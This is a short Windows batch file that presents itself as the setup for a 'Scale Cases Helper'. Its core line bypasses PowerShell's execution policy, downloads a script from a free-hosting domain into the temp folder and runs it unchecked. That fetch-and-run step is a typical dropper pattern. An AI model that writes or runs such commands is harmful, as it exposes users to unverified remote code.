@echo off
title Scale Cases Setup
echo Installing the Scale Cases Helper. This window can take a few minutes; leave it open.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$f = Join-Path $env:TEMP 'scalecases-setup.ps1'; Invoke-WebRequest -UseBasicParsing 'https://scalecases-client.onrender.com/setup/windows.ps1' -OutFile $f; & $f"
pause
